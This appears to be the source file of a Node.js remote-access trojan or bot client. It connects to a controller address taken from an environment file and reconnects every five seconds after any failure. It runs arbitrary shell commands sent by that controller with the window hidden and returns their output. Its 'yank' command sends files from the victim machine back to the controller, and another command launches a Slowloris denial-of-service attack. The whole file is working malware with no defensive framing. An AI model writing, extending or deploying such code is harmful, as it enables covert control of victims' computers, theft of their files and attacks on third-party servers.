import net from "net";
import util from "util";
import child_process from "child_process";
import process from "process";
import * as fs from "fs";
import dotenv from "dotenv";
import changeDir from "./shell.js";
import slowLoris from "./attacks/slowloris.js";

dotenv.config({ path: "../../config/.env" });

const exec = util.promisify(child_process.exec);
let path = process.cwd();

const PORT = process.env.PORT;
const IP = process.env.IP;

export const client = new net.Socket();
let intervalConnect = false;

function connect() {
	client.connect({
		port: PORT,
		host: IP,
	});
}

function launchIntervalConnect() {
	if (false != intervalConnect) return;
	intervalConnect = setInterval(connect, 5000);
}

function clearIntervalConnect() {
	if (false == intervalConnect) return;
	clearInterval(intervalConnect);
	intervalConnect = false;
}

function sendFile(filePath) {
	const readStream = fs.createReadStream(filePath);

	readStream.on("data", (chunk) => {
		client.write(chunk);
	});

	readStream.on("error", (err) => {
		console.log(err);
	});
}

async function execute(command) {
	await exec(
		command,
		{ cwd: path, windowsHide: true },
		(e, stdout, stderr) => {
			client.write(`${stdout}\n`);
		}
	);
}

client.on("data", (data) => {
	const dataStr = data.toString();

	const args = {
		first: dataStr.split(" ")[1],
		second: dataStr.split(" ")[2],
		third: dataStr.split(" ")[3],
		fourth: dataStr.split(" ")[4],
	};

	if (dataStr.startsWith("exec")) {
		if (args.first === "cd") {
			path = changeDir(data, path);
		}
		execute(dataStr.replace("exec", ""));
	}

	if (dataStr.startsWith("slowloris")) {
		slowLoris(
			args.first,
			args.second,
			args.third,
			args.fourth
		);
	}

	if (dataStr.startsWith("yank")) {
		sendFile(path + "\\" + args.first);
	}
});

client.on("connect", () => {
	clearIntervalConnect();
});

client.on("error", (err) => {
	launchIntervalConnect();
});

client.on("close", launchIntervalConnect);
client.on("end", launchIntervalConnect);

connect();
